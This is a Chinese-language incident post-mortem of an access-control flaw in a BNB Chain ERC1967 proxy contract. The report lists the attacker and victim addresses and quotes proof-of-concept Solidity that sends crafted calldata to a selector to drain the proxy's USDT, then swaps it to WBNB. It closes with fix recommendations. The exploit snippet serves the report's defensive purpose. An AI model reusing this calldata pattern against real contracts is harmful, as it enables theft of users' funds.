# Proxy_b7e1 Hack 根因分析报告

## 📊 执行摘要
- **项目**: Proxy_b7e1
- **日期**: 2024
- **网络**: BNB Chain (BSC)
- **损失**: ~ $8.5K
- **类型**: 升级/代理合约数据驱动调用的访问控制缺陷
- **级别**: 🔴 严重

## 🎯 攻击概览
- **攻击者**: `0x9f2eceC0145242c094b17807f299Ce552A625ac5`
- **攻击合约**: `0x9b78b5d9febce2b8868ea6ee2822cb482a85ad74`
- **受害合约 (ERC1967Proxy)**: `0xb7E1D1372f2880373d7C5a931cDbAA73C38663C6`
- **攻击交易**: [`0x864d33d006e5c39c9ee8b35be5ae05a2013e556be3e078e2881b0cc6281bb265`](https://bscscan.com/tx/0x864d33d006e5c39c9ee8b35be5ae05a2013e556be3e078e2881b0cc6281bb265)

## 💻 技术分析

PoC 显示可以对代理合约直接 `call` 特定选择器并拼接参数，驱动内部逻辑在无授权校验下转移代币与生成订单：

```solidity
bytes32 fixedData1 = hex"000001baffffe897231d193affff3120000000e19c552ef6e3cf430838298000";
bytes memory data = abi.encodePacked(
    bytes4(0x9b3e9b92),
    abi.encode(
        address(BEP20USDT),
        fixedData1,
        uint256(0),
        uint256(1),
        uint256(192),
        uint256(224),
        uint256(0),
        uint256(0)
    )
);
(bool c2, ) = ERC1967Proxy.call(data);

// 随后再次构造 data2 进行提取，最终将 Proxy 内 USDT 卖出为 WBNB 提走
```

接着使用 `swapExactTokensForETHSupportingFeeOnTransferTokens` 将从代理中获得的 USDT 卖成 WBNB 转出：

```solidity
address[] memory path = new address[](2);
path[0] = BEP20USDT;
path[1] = wbnb;
IPancakeRouter(payable(PancakeRouter)).swapExactTokensForETHSupportingFeeOnTransferTokens(
    selfBal,
    0,
    path,
    tx.origin,
    block.timestamp
);
```

关键问题在于代理合约对数据驱动的函数调用缺少权限/上下文校验，使攻击者可构造底层实现的敏感调用路径，读取代理余额并外部化。

### 影响评估
- 直接损失约 $8.5K（以 PoC 注释统计为准）。
- 风险范围：代理持有资产或拥有代扣权限的情况下，均可能被外部构造数据包提走。

## 🎯 根本原因
代理/升级合约暴露了可由任意外部地址触发的“数据驱动调用”入口，底层实现对调用者身份、调用上下文（订单创建、结算参数）缺少鉴权和不变量检查：
- 未对调用者进行 `onlyOwner/onlyRole` 校验；
- 拼接的参数可直接影响内部状态（如 `nextOrderId`）与资金流；
- 代币转移/清算流程未绑定业务前置条件（白名单、订单签名、时序）。

## 🛠️ 修复建议
短期：
- 禁用对外暴露的“裸 `call` + 自由拼参”入口，或加 `onlyOwner/onlyRole`；
- 对涉及资金/订单的函数增加严格的签名校验与上下文校验（如 EIP-712 授权、订单状态、不变量检查）；
- 对代理持有资产设定可提额度上限与多签审批。

长期：
- 采用经过审计的代理与访问控制模式（UUPS + AccessControl/Ownable2Step）；
- 对“任意数据执行”类接口进行移除或受限，仅对受信模块开放；
- 增强事件与断言，防范越权数据路径触达敏感逻辑。

## 🔗 参考
- 受害合约：`0xb7E1D1372f2880373d7C5a931cDbAA73C38663C6`
- 攻击交易：`0x864d33d0...bb265`
- 信息来源：`https://x.com/TenArmorAlert/status/1860867560885150050`

---
**报告生成**: 2025-10-12 | **版本**: 1.1
